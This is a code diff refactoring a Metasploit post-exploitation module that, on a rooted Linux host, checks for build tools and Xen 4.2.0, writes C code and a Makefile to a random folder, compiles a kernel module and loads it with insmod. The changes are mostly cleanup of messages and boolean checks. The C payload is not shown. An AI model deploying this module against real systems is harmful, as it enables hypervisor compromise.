@@ -48,7 +48,7 @@ class MetasploitModule < Msf::Post
     return unless requirements?
 
     # Cearting and writing random paths and files
-    print_status('Creating random file- and foldernames')
+    vprint_status('Creating random file and folder names')
     write_files
 
     # Execute make and insmod
@@ -69,7 +69,7 @@ class MetasploitModule < Msf::Post
 
   def requirements?
     unless is_root?
-      print_error("Sorry, you're not root - abort")
+      print_error("Sorry, root access is required - abort")
       return false
     end
     print_good('Detected root privilege')
@@ -109,8 +109,6 @@ class MetasploitModule < Msf::Post
   ##
 
   def build_essential?
-    build_essential = false
-
     check_command = 'if [ -s $( which gcc ) ] && '
     check_command << '[ -s $( which g++ ) ] && '
     check_command << '[ -s $( which make ) ] && '
@@ -118,11 +116,7 @@ class MetasploitModule < Msf::Post
     check_command << 'then echo OK;'
     check_command << 'fi'
 
-    output_command = cmd_exec(check_command).delete("\r")
-
-    build_essential = true if output_command['OK'] == 'OK'
-
-    build_essential
+    cmd_exec(check_command).delete("\r") == 'OK'
   end
 
   ##
@@ -132,8 +126,6 @@ class MetasploitModule < Msf::Post
   ##
 
   def xen?
-    xen = false
-
     check_command = 'if [ "$( lsmod | grep xen )" != "" ] || '
     check_command << '[ "$( lscpu | grep Xen )" != "" ] || '
     check_command << '[ "$( dmesg | grep xen )" != "" ] || '
@@ -141,11 +133,7 @@ class MetasploitModule < Msf::Post
     check_command << 'then echo OK;'
     check_command << 'fi'
 
-    output_command = cmd_exec(check_command).delete("\r")
-
-    xen = true if output_command['OK'] == 'OK'
-
-    xen
+    cmd_exec(check_command).delete("\r") == 'OK'
   end
 
   ##
@@ -155,17 +143,9 @@ class MetasploitModule < Msf::Post
   ##
 
   def xen_running?
-    xen_running = false
+    check_command = 'if [ -f /var/run/xenstored.pid -o -f /var/run/xenstore.pid ] ; then echo OK; fi'
 
-    check_command = 'if [ -f /var/run/xenstored.pid ] ; '
-    check_command << 'then echo OK;'
-    check_command << 'fi'
-
-    output_command = cmd_exec(check_command).delete("\r")
-
-    xen_running = true if output_command['OK'] == 'OK'
-
-    xen_running
+    cmd_exec(check_command).delete("\r") == 'OK'
   end
 
   ##
@@ -186,9 +166,7 @@ class MetasploitModule < Msf::Post
 
     print_status('Xen Version: ' + xen_version)
 
-    right_xen_version = true if xen_version == '4.2.0'
-
-    right_xen_version
+    xen_version == '4.2.0'
   end
 
   ##
@@ -202,12 +180,12 @@ class MetasploitModule < Msf::Post
     @c_file = "#{@writeable_folder}/#{@c_name}.c"
     @make_file = "#{@writeable_folder}/Makefile"
 
-    print_status("Creat folder '#{@writeable_folder}'")
+    vprint_status("Creating folder '#{@writeable_folder}'")
     cmd_exec("mkdir #{@writeable_folder}")
 
-    print_status("Writing c code to '#{@c_file}'")
+    vprint_status("Writing C code to '#{@c_file}'")
     write_file(@c_file, c_code)
-    print_status("Writing Makefile to '#{@make_file}'")
+    vprint_status("Writing Makefile to '#{@make_file}'")
     write_file(@make_file, make_code)
   end
 
@@ -217,9 +195,9 @@ class MetasploitModule < Msf::Post
 
   def do_insmod
     cmd_exec("cd #{@writeable_folder}")
-    print_status('Making modul...')
+    vprint_status('Making module...')
     cmd_exec('make')
-    print_status("Insmod '#{@writeable_folder}/#{@c_name}.ko'")
+    vprint_status("Insmod '#{@writeable_folder}/#{@c_name}.ko'")
     cmd_exec("insmod #{@writeable_folder}/#{@c_name}.ko")
   end
 
